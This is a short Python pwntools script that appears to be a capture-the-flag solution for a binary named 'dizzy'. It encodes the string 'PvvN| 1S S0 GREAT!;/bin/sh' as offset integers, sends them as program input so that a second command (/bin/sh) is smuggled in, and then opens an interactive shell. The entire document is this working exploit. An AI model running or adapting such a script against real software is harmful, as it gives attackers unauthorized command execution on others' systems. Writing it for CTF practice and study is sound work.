from pwn import *

sh = process('./dizzy')
#sh = remote('x', 'xx')

pattern = b"PvvN| 1S S0 GREAT!;/bin/sh\0"

cnt = 0
payload = b''
buf = b''
for pat in pattern:
    #print(buf)
    buf += bytes([pat])
    if len(buf) == 4:
        cnt += 1
        sh.sendline(bytes(str(u32(buf) - 114514), encoding = 'utf-8'))
        print(u32(buf)-114514)
       # print(hex(u32(buf)))
        buf = b''

while len(buf) < 4:
    buf += b'\0'

sh.sendline(bytes(str(u32(buf) - 114514), encoding = 'utf-8'))
print(u32(buf) - 114514)
#print(hex(u32(buf)))

while cnt < 19:
    print(0-114514)
    sh.sendline(bytes(str(0 - 114514), encoding = 'utf-8'))
    cnt += 1
sh.interactive()
